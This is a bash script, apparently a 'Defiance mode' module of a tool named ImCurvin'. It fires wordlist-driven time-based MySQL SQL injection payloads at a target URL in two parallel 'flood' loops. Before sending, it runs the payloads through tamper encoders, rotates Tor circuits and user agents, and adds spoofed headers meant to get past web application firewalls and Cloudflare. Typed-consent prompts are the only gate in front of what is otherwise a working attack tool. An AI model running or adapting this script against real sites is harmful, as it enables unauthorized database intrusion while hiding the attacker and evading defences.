#!/bin/bash
# ImCurvin' v1.2.0
# Copyright 2026 Skokoo
# Licensed under the Apache License, Version 2.0

target_url="$1"
export DEFIANCE_DIR="$(cd "$(dirname "${BASH_SOURCE}")" && pwd)"
export ROOT_LOG_FILE="$DEFIANCE_DIR/../targetDef.log"

source "$DEFIANCE_DIR/../tamper/hungry.sh"

if [ -n "$custom_wordlist" ] && [ -f "$custom_wordlist" ]; then
    export WORDLIST_MYSQL="$custom_wordlist"
else
    if [ "$nerf_mode" = "true" ]; then
        export WORDLIST_MYSQL="$DEFIANCE_DIR/../data/nerfdef.txt"
    else
        export WORDLIST_MYSQL="$DEFIANCE_DIR/../data/sqli_defiance.txt"
    fi
fi

# OH MY GOD, THIS FUNC. hey, this is for yk yk. See the text id u dk.
eexit() {
    trap - SIGINT SIGTERM EXIT
        echo -e "\e[0;31m[-] Interrupted,\e[0m Clearing environment process tree.."
    kill -9 -$$ 2>/dev/null
}
trap 'eexit' SIGINT

if [ -n "$custom_proxy" ]; then
    export TOR_CIRCUITS=("$custom_proxy")
else
    export TOR_CIRCUITS=(9050 9052 9054 9056 9058 9060)
fi

export DEFIANCE_UA=(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0"
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/605.1.15"
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
)

print_defiance_logo() {
    echo -e "                \e[38;5;18m▄\e[0m"
    echo -e "              \e[38;5;18m▄██\e[0m"
    echo -e "            \e[38;5;18m▄██\e[38;5;21m█▀\e[0m"
    echo -e "          \e[38;5;18m▄██\e[38;5;21m▄██\e[38;5;27m█▀\e[0m"
    echo -e "        \e[38;5;18m▄██\e[38;5;21m▄██\e[38;5;27m▄██\e[38;5;39m█▀\e[0m"
    echo -e "      \e[38;5;18m▄██\e[38;5;21m▄██\e[38;5;27m▄██\e[38;5;39m▄██\e[38;5;45m█▀\e[0m"
    echo -e "    \e[38;5;18m▄██\e[38;5;21m▄██\e[38;5;27m▄██\e[38;5;39m▄██\e[38;5;45m▄██\e[38;5;51m█▀\e[0m"
    echo -e "  \e[38;5;18m▄██\e[38;5;21m▄██\e[38;5;27m▄██\e[38;5;39m▄██\e[38;5;45m▄██\e[38;5;51m▄██\e[38;5;15m██\e[0m"
    echo -e "  \e[38;5;18m▀██\e[38;5;21m▀██\e[38;5;27m▀██\e[38;5;39m▀██\e[38;5;45m▀██\e[38;5;51m▀██\e[38;5;15m██\e[0m"
    echo -e "    \e[38;5;18m▀██\e[38;5;21m▀██\e[38;5;27m▀██\e[38;5;39m▀██\e[38;5;45m▀██\e[38;5;51m█▄\e[0m"
    echo -e "      \e[38;5;18m▀██\e[38;5;21m▀██\e[38;5;27m▀██\e[38;5;39m▀██\e[38;5;45m█▄\e[0m"
    echo -e "        \e[38;5;18m▀██\e[38;5;21m▀██\e[38;5;27m▀██\e[38;5;39m█▄\e[0m"
    echo -e "          \e[38;5;18m▀██\e[38;5;21m▀██\e[38;5;27m█▄\e[0m"
    echo -e "            \e[38;5;18m▀██\e[38;5;21m█▄\e[0m"
    echo -e "              \e[38;5;18m▀██\e[0m"
    echo -e "                \e[38;5;18m▀\e[0m"
    echo -e "\n\e[0;31m[\e[0m!\e[0;37m]\e[0m Defiance mode activated, ImCurlin no longer friendly ;("
    if [ -n "$custom_proxy" ]; then
        echo -e "\e[0;31m[\e[0m!\e[0;37m]\e[0m Routing via $custom_proxy"
    else
        echo -e "\e[0;31m[\e[0m!\e[0;37m]\e[0m MultiCircuit Rotation Enabled. IPs are shifting dynamically per request.!"
    fi
}

braindamage() {
    local choice=$((RANDOM % 3))
    local cf_ray=$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 16 | head -n 1)
    case "$choice" in
        0) echo "-H X-Forwarded-For:127.0.0.1 -H CF-Connecting-IP:172.67.$((RANDOM % 254 + 1)).$((RANDOM % 254 + 1)) -H CF-RAY:${cf_ray}-CGK" ;;
        1) echo "-H Content-Type:application/json;multipart/form-data;boundary=$((RANDOM % 9999)) -H CF-Visitor:{\"scheme\":\"https\"}" ;;
        2) echo "-H X-WAF-Bypass:True -H CF-IPCountry:US -H True-Client-IP:103.21.244.$((RANDOM % 254 + 1))" ;;
    esac
}

vector_sqli_agressor_left() {
    local agressor_ua="Mozilla/5.0 (Linux; Android 10; Termux_Agresor_L1)"

    while IFS='|' read -r default_path query_payload || [ -n "$query_payload" ]; do
        [[ -z "$default_path" ]] && continue

        local random_port=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
        if [ -n "$custom_proxy" ]; then local proxy_flag="-x $random_port --fail"; else local proxy_flag="--socks5-hostname 127.0.0.1:$random_port --socks5-gssapi-nec --fail"; fi
        local random_ua=${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}
        local t1=$(between_engine "$default_path")
        local t2=$(charencode_engine "$t1")
        local t3=$(apostrophenullencode_engine "$t2")
        local t4=$(randomcase_engine "$t3")
        local t5=$(space2comment_engine "$t4")
        local t6=$(appendnullbyte_engine "$t5")
        local t7=$(xor_engine "$t6")
        local defiance_tamper_path=$(weirdcomment_engine "$t7")
        local final_query=""
        if [[ "$defiance_tamper_path" == *"="* ]]; then
            local param_name=$(echo "$defiance_tamper_path" | cut -d'=' -f1)
            local param_val=$(echo "$defiance_tamper_path" | cut -d'=' -f2-)
            final_query="${param_name}=999&${param_name}=${param_val}${query_payload}"
        else
            final_query="${defiance_tamper_path}${query_payload}"
        fi

        local waf_trick=$(braindamage)

        echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Vector 1 [Port:$random_port] Probing Latency on: \e[38;5;236m$target_url$final_query\e[0m"

        local stopwatch=$(curl $proxy_flag $waf_trick -m 12 -A "$random_ua" -s -o /dev/null -w "%{time_total}" "$target_url$final_query")

        if (( $(echo "$stopwatch > 4.0" | bc -l) )); then
            echo -e "    \e[0;31m[!+!]\e[0m Vector 1 confirmed MySQL Anomaly: ${stopwatch}s"
            echo "SQLI_ALERT|$default_path|$query_payload" >> "$ROOT_LOG_FILE"
        fi
        sleep 5
    done < "$WORDLIST_MYSQL"
}

vector_sqli_agressor_right() {
    local agressor_ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64; Termux_Agresor_R2)"

    while IFS='|' read -r default_path query_payload || [ -n "$query_payload" ]; do
        [[ -z "$default_path" ]] && continue

        local random_port=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
        if [ -n "$custom_proxy" ]; then local proxy_flag="-x $random_port --fail"; else local proxy_flag="--socks5-hostname 127.0.0.1:$random_port --socks5-gssapi-nec --fail"; fi
        local random_ua=${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}
        local t1=$(between_engine "$default_path")
        local t2=$(charencode_engine "$t1")
        local t3=$(apostrophenullencode_engine "$t2")
        local t4=$(randomcase_engine "$t3")
        local t5=$(space2comment_engine "$t4")
        local t6=$(appendnullbyte_engine "$t5")
        local t7=$(xor_engine "$t6")
        local defiance_tamper_path=$(weirdcomment_engine "$t7")

        local final_query=""
        if [[ "$defiance_tamper_path" == *"="* ]]; then
            local param_name=$(echo "$defiance_tamper_path" | cut -d'=' -f1)
            local param_val=$(echo "$defiance_tamper_path" | cut -d'=' -f2-)
            final_query="${param_name}=999&${param_name}=${param_val}${query_payload}"
        else
            final_query="${defiance_tamper_path}${query_payload}"
        fi

        local waf_trick=$(braindamage)

        echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Vector 2 [Port:$random_port] Probing Latency on: \e[38;5;236m$target_url$final_query\e[0m"

        local stopwatch=$(curl $proxy_flag $waf_trick -m 12 -A "$random_ua" -s -o /dev/null -w "%{time_total}" "$target_url$final_query")

        if (( $(echo "$stopwatch > 4.0" | bc -l) )); then
            echo -e "    \e[0;31m[!+!]\e[0m Vector 2 confirmed MySQL Anomaly: ${stopwatch}s"
            echo "SQLI_ALERT|$default_path|$query_payload" >> "$ROOT_LOG_FILE"
        fi
        sleep 5
    done < "$WORDLIST_MYSQL"
}

clear
print_defiance_logo

echo -e "\n\e[0;31m[\e[0m!\e[0;37m]\e[0m \e[1;31mLEGAL WARNING 1/2:\e[0m Defiance Mode fires a multivector parallel network flood."
echo -e "Executing this mode against unauthorized infrastructures strictly violates cyber laws."
echo -n -e "\e[0;33m[\e[0m?\e[0;37m]\e[0m Do you have explicit written consent from the target owner? (YES/no): "
read -r legal_1

if [ "$legal_1" != "YES" ]; then
    echo -e "\n\e[0;31m[\e[0m-\e[0;37m]\e[0m Aborted. Unauthorized scanning is strictly illegal."
    exit 1
fi

echo -e "\n\e[0;31m[\e[0m!\e[0;37m]\e[0m \e[1;31mLEGAL WARNING 2/2:\e[0m This tool is NOT server friendly in Defiance Mode."
echo -e "This action will trigger heavy CPU calculation loads and dynamic Multi IP routing on the target."
echo -n -e "\e[0;33m[\e[0m?\e[0;37m]\e[0m Type \e[1;33m'I ACCEPT ALL RISKS'\e[0m to proceed with the execution sequence: "
read -r legal_2

if [ "$legal_2" != "I ACCEPT ALL RISKS" ]; then
    echo -e "\n\e[0;31m[\e[0m-\e[0;37m]\e[0m Verification failed. Revert. Operation canceled."
    exit 1
fi

if [ -z "$custom_proxy" ]; then
    echo -e "\n\e[0;33m[\e[0m!\e[0;37m]\e[0m Checking for TOR terminal service..."
    if pgrep -x "tor" >/dev/null 2>&1; then
        echo -e "\e[0;32m[\e[0m=\e[0;32m]\e[0m Tor terminal service detected as active."
    else
        echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m WARNING: Tor terminal service is not detected/running."
        echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m Run 'tor' command in a new terminal before using Defiance Mode."
        echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m Operation aborted due to environment mismatch."
        exit 1
    fi
fi

echo -e "\n\e[0;32m[\e[0m+\e[0;37m]\e[0m Double legal verification passed. Pre Scan targeting engine engaged."
sleep 1

echo -e "\n\e[0;34m[\e[0m*\e[0;37m]\e[0m Performing database environment verification.."
recon_port=${TOR_CIRCUITS}
if [ -n "$custom_proxy" ]; then recon_proxy="-x $recon_port"; else recon_proxy="--socks5-hostname 127.0.0.1:$recon_port"; fi

server_fingerprint=$(curl $recon_proxy -m 5 -s -I "$target_url" | grep -Ei "(Server|X-Powered-By|Set-Cookie|X-DDoS|WAF)")

if echo "$server_fingerprint" | grep -qEi "(oracle|postgre|mssql|microsoft-iis|supabase)"; then
    echo -e "\n\e[0;31m[\e[0m!\e[0;37m]\e[0m Target rejected, Non MySQL environment fingerprint."
    echo -e "    Footprint: $(echo "$server_fingerprint" | tr '\r\n' ' ')"
    echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m Revert. Defiance Mode stands down to prevent structural asset wastage."
    exit 1
else
    echo -e "\e[0;32m[\e[0m+\e[0;37m]\e[0m Target environment matches MySQL compliance directives."
fi
sleep 1

echo -e "\n\e[0;34m[\e[0mi\e[0;37m]\e[0m Launching dualvector synchronized flood attack against \e[1;34m$target_url\e[0m...\n"

vector_sqli_agressor_left &
pid_vector1=$!

vector_sqli_agressor_right &
pid_vector2=$!

wait $pid_vector1 $pid_vector2

echo -e "\n\e[0;32m[\e[0m=\e[0;32m]\e[0m Attack sequence completed. Input to Defiance Log Analyst.."
sleep 1

if [ -f "$DEFIANCE_DIR/../validators/defval.py" ]; then
    python "$DEFIANCE_DIR/../validators/defval.py"
else
    echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m validators/defval.py not found. Skipping validate."
fi

echo ""
echo -e "\e[0;32m[\e[0m=\e[0;32m]\e[0m Ending  Sequence. ImCurvin' 1.2.0."